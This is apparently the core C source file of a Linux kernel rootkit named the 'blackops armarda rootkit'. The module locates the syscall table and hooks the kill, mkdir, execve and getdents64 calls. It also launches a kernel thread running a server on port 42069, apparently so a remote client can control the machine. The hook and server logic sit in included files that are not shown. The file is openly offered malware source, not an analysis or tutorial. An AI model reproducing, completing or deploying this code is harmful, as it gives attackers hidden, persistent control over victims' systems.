/*===================================================*\
  core functions to initiate and clean up the rootkit
\*===================================================*/

#include <linux/init.h> //macros used to mark up functions   e.g. __init __exit
#include <linux/module.h> // core header for loading module into kernel
#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
#include <linux/string.h> // contains functions for string operations

static int BUFFER_SIZE = 2048;
static char ROOTKIT_ID[] =  "Rootkit198760";

#include "includes/log.c" //functions for file I/O and for
#include "includes/server.c" //functions to run server and communicate with client
#include "includes/syscall_table.c" //functions for getting sycall syscall_table
#include "includes/hooks.c" //functions for hooking syscalls
#include "includes/hooked_syscalls.c" //functions of the hooked syscalls

static int __init ModuleInit(void);
static void __exit ModuleExit(void);



static int __init ModuleInit(void) {
	printk("[rootkit][core.c::ModuleInit] DEBUG    rootkit initiated\n");  //DEBUG
	init_logging();
	log("[core.c::ModuleInit] logging initiated\n");
	get_syscall_table();
	install_hook(&sys_kill);
	install_hook(&sys_mkdir);
	install_hook(&sys_execve);
	install_hook(&sys_getdents64);
	unsigned short int port = 42069;
	kthread_run(run_server, (void *) port, "server"); //starts thread to run the server
	return 0;
}

static void __exit ModuleExit(void) {
	remove_hook(&sys_kill);
	remove_hook(&sys_mkdir);
	remove_hook(&sys_execve);
	remove_hook(&sys_getdents64);
	log("[core.c::ModuleExit] removed all hooks");
	remove_server();
	close_logging();
}

module_init(ModuleInit);
module_exit(ModuleExit);
MODULE_AUTHOR("LordOfTheIoT");
MODULE_DESCRIPTION("blackops armarda rootkit");
MODULE_LICENSE("GPL");
MODULE_VERSION("1.07");
